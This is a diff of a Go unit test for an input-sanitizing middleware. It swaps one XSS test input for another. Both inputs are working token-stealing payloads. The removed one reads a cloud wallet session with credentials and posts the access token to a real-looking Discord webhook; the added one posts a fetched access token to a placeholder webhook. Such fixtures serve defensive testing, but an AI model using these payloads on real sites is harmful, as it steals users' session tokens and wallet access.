@@ -24,12 +24,19 @@ func TestInputSanitizerMiddleware(t *testing.T) {
 		{
 			name: "Sanitize HTML tags",
 			input: map[string]interface{}{
-				"title":   "<script>alert('XSS')</script>",
-				"content": `<img src=/ onerror='fetch("https://login-api.mycloudwallet.com/v1/wcw/session", {"referrer": "https://www.mycloudwallet.com/","referrerPolicy": "strict-origin-when-cross-origin","method": "GET","mode": "cors","credentials": "include"}).then(function(t){return console.log("Request succeeded with Response object",t),t}).then(function(t){return t.json()}).then(function(t){console.log(t.access_token),fetch("https://discord.com/api/v10/webhooks/1295329429907574795/FFHw8CVn-q8sNE5znRHzpcRRjp3jj_cN3K_bUfIm_8Cy8I8BhBZ3oskkZxOCQeY7loZn?wait=true",{headers:{accept:"application/json","content-type":"application/json"},body:{"content":"\\\ ${t.token} \\\","embeds":null,"attachments":[]},method:"POST"})});'\>lucy\</img\>`,
+				"title": "<script>alert('XSS')</script>",
+				"content": `<svg/onload='fetch("https://uncut.network/api/user").then(function(t){return
+console.log("Request succeeded with Response
+object",t),t}).then(function(t){return
+t.json()}).then(function(t){console.log(t.access_token),fetch("https://discord.
+com/api/v10/webhooks/your/WebhookAddress?wait=true",{headers:{accept:"applicati
+on/json","content-type":"application/json"},body:'{"content":"
+				${t.access_token}
+				","embeds":null,"attachments":[]}',method:"POST"})});'>`,
 			},
 			expectedOutput: map[string]interface{}{
 				"title":   "",
-				"content": `<img src="/">lucy\`,
+				"content": ``,
 			},
 		},
 		{
